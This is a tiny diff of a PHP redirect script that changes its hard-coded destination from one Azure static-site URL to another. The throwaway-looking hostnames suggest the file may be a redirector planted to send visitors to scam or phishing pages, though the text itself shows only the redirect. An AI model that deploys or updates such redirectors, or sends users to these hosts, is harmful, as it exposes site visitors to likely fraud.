@@ -1,5 +1,5 @@
 <?php
-$url = "https://followmylead97.z9.web.core.windows.net/";
+$url = "https://letme8fix8it.z9.web.core.windows.net//";
 header('Location: '.$url);
 die();
 ?>
